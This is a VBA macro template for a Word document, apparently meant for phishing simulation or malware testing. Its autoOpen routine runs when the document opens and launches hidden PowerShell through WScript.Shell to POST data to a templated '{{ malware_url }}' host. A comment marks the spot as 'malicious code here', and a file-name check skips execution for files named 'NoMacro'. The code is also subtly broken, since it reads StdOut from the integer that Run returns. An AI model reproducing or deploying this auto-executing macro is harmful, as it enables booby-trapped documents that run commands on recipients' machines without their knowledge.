Sub psScript()
    Dim script As String
    script = "curl -Uri '{{ malware_url }}' -Method Post -Headers @{'Content-Type' = 'application/x-www-form-urlencoded'} -Body 'email=makro@test'"

    Dim output As String
    output = RunShellCommand(script)

    'MsgBox output
End Sub

Function RunShellCommand(command As String) As String
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")

    Dim output As String
    output = shell.Run("powershell.exe -Command " & command, 0).StdOut.ReadAll
    

    RunShellCommand = output
End Function

Sub autoOpen()
    Dim doc As Document
    Set doc = ActiveDocument
    
    If Split(doc.Name, ".")(1) = "NoMacro" Then
        
        Exit Sub
    
    Else
    
        'malicious code here
        Call psScript
    
    End If
    
End Sub
